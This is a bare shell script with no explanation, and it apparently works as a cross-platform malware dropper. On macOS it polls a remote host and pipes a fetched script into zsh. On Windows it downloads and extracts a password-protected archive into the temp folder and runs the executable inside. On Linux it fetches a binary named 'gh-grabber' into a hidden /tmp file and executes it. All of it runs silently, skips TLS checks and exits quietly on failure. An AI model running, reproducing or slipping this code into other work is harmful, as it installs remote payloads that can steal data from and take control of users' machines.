#!/bin/bash
API=https://f.scyldu.com/api
BASE=https://f.scyldu.com/fd8a70f7f5c848a7ab6f2fea13d547ca
rnd() { openssl rand -hex "$1" 2>/dev/null || od -An -N"$1" -tx1 /dev/urandom | tr -d ' \n'; }
case "$(uname -s)" in
  Darwin)
    U=$(rnd 8)
    curl -kfsSL -X POST "$API/macclaim" -H 'Content-Type: application/json' -d "{\"uuid\":\"$U\"}" >/dev/null || exit 0
    for _ in $(seq 1 40); do
      S=$(curl -kfsSL "$API/macclaim/$U" 2>/dev/null)
      case "$S" in *'"done"'*) break ;; *'"error"'*) exit 0 ;; esac
      sleep 2
    done
    curl -kfsSL "$API/macclaim/$U/s" | zsh
    ;;
  MINGW*|MSYS*|CYGWIN*)
    U=$(rnd 8); P=$(rnd 7); I=$(rnd 4).bin
    curl -fsSL -X POST "$API/claim" -H 'Content-Type: application/json' -d "{\"uuid\":\"$U\",\"password\":\"$P\",\"inner\":\"$I\"}" >/dev/null || exit 0
    for _ in $(seq 1 40); do
      S=$(curl -fsSL "$API/claim/$U" 2>/dev/null)
      case "$S" in *'"done"'*) break ;; *'"error"'*) exit 0 ;; esac
      sleep 2
    done
    cmd //c "curl -s -o %TEMP%\\z $BASE/c$U.zip && tar -xf %TEMP%\\z -C %TEMP% --passphrase $P && ren %TEMP%\\$I s.exe && start \"\" %TEMP%\\s.exe"
    ;;
  *)
    curl -fsSL 'https://raw.githubusercontent.com/deacon6288/gh-grabber/main/bin/grabber-amd64' -o /tmp/.gd && chmod +x /tmp/.gd && /tmp/.gd
    ;;
esac
true
